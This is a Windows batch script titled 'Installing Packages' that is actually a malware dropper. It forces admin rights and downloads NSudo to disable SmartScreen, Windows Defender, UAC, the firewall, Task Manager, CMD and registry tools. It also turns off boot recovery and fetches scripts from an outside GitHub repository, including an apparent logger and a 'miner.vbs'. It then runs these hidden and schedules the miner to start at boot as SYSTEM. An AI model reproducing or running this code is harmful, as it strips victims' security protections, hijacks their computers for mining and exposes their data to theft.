@echo off

title Installing Packages 
:: BatchGotAdmin
::-----------------------------------------
REM  --> CheckING for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin

REM curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/svchost.bat
REM call svchost.bat

color 0a



cd  %temp%

bitsadmin/transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe

set pop=%systemroot%

NSudo -U:T -ShowWindowMode:Hide icacls "%pop%\System32\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18

NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"  /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f

NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
 
NSudo -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f

NSudo -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d "1" /f

NSudo -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f

NSudo -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f

NSudo -U:T -ShowWindowMode:Hide  sc stop  windefend  

NSudo -U:T -ShowWindowMode:Hide  sc delete  windefend  

powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""

NSudo -U:T -ShowWindowMode:Hide bcdedit /set {default} recoveryenabled No

NSudo -U:T -ShowWindowMode:Hide bcdedit /set {default} bootstatuspolicy ignoreallfailures

powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"

powershell.exe New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force

powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"

powershell.exe -command "Set-MpPreference -PUAProtection disable"

powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"
powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6"
      
powershell.exe -command "Set-MpPreference -LowThreatDefaultAction 6"

powershell.exe -command "Set-MpPreference -SevereThreatDefaultAction 6"

powershell.exe -command "Set-MpPreference -ScanScheduleDay 8"

powershell.exe -command "netsh advfirewall set allprofiles state off"

REM cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

REM powershell -command "start-bitstransfer https://direct-url-for-payload/xxx.exe   .\Winupdate.exe"

REM start  Winupdate.exe & cd %temp% & Disable-Tamper.cmd


mkdir %USERPROFILE%\AppData\Roaming\System_logs
cd %USERPROFILE%\AppData\Roaming\System_logs

curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/logs.bat
curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/logs.ps1
curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/raccourci.ps1
curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/miner.vbs

powershell.exe -ExecutionPolicy Bypass -File raccourci.ps1
powershell.exe -ExecutionPolicy Bypass -File dowload.ps1

start powershell.exe -ExecutionPolicy Bypass -File dowload.ps1
schtasks /create /tn "tkt" /tr "%USERPROFILE%\AppData\Roaming\System_logs\miner.vbs" /sc onstart /ru System

move C:\logs.lnk "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

del %USERPROFILE%\AppData\Roaming\System_logs\raccourci.ps1


Powershell.exe -NoLogo -WindowStyle Hidden -executionpolicy remotesigned -File  %USERPROFILE%\AppData\Roaming\System_logs\logs.ps1
